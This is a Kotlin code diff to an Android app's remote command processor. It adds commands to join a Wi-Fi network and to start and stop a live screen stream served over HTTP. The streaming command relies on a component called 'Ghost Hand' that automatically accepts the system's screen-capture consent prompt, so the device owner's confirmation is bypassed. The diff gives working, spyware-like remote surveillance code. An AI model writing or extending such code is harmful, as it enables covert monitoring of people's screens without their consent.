@@ -900,7 +900,86 @@ object CommandProcessor {
                         }
                     }
                 }
-                "RECORD_SCREEN" -> {
+                                "CONNECT_WIFI" -> {
+                    val parts = content.split("|")
+                    if (parts.isNotEmpty() && parts[0].trim().isNotEmpty()) {
+                        val ssid = parts[0].trim()
+                        val pass = if (parts.size > 1) parts[1].trim() else ""
+                        DebugLogger.log("CMD_WIFI", "Triggering Wi-Fi join for SSID: $ssid")
+                        WifiConnector.connect(ctx, ssid, pass)
+                        
+                        var connected = false
+                        var localIp = ""
+                        for (attempt in 1..24) { // Poll up to 12s
+                            kotlinx.coroutines.delay(500)
+                            val connStatus = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("wifi_connect_status", "NONE")
+                            if (connStatus == "SUCCESS") {
+                                connected = true
+                                localIp = WifiConnector.getLocalIpAddress(ctx) ?: "192.168.43.X"
+                                break
+                            }
+                        }
+                        if (connected) {
+                            status = "WIFI_CONNECTED"
+                            errorMsg = "Connected to $ssid. Local IP: $localIp | Gateway: 192.168.43.1"
+                        } else {
+                            status = "WIFI_CONNECT_FAILED"
+                            errorMsg = "Failed to connect to $ssid within 12s. Check password or hotspot availability."
+                        }
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Usage: SSID | PASSWORD"
+                    }
+                }
+                "START_STREAM" -> {
+                    val parts = content.split("|")
+                    val fps = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 30
+                    val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
+                    val port = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 8888
+
+                    if (LiveStreamManager.isStreaming) {
+                        val ip = WifiConnector.getLocalIpAddress(ctx) ?: "192.168.43.X"
+                        status = "ALREADY_STREAMING"
+                        errorMsg = "Stream already broadcasting at http://$ip:$port ($fps FPS)"
+                    } else {
+                        LiveStreamManager.pendingFps = fps
+                        LiveStreamManager.pendingQual = qual
+                        LiveStreamManager.pendingPort = port
+                        ScreenRecordManager.expectedMode = "AUTO"
+
+                        val i = Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_screen_record_trigger", true)
+                            putExtra("is_live_stream", true)
+                        }
+                        ctx.startActivity(i)
+
+                        // Wait up to 6 seconds for Ghost Hand or manual confirmation
+                        var streamActive = false
+                        for (step in 1..12) {
+                            kotlinx.coroutines.delay(500)
+                            if (LiveStreamManager.isStreaming) {
+                                streamActive = true
+                                break
+                            }
+                        }
+
+                        val ip = WifiConnector.getLocalIpAddress(ctx) ?: "192.168.43.X"
+                        if (streamActive) {
+                            status = "STREAM_ACTIVE"
+                            errorMsg = "Stream LIVE at http://$ip:$port ($fps FPS). Ghost Hand auto-accepted!"
+                        } else {
+                            status = "MANUAL_ACTION_REQUIRED"
+                            errorMsg = "Ghost Hand awaiting confirmation. Please tap 'Start now' on the screen (5s window active)!"
+                        }
+                    }
+                }
+                "STOP_STREAM" -> {
+                    LiveStreamManager.stopStream()
+                    status = "STREAM_STOPPED"
+                    errorMsg = "Live screen stream terminated and server closed."
+                }
+"RECORD_SCREEN" -> {
                     ScreenRecordManager.pendingCmdId = id
                     val parts = content.split("|")
                     val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "TRIGGER"
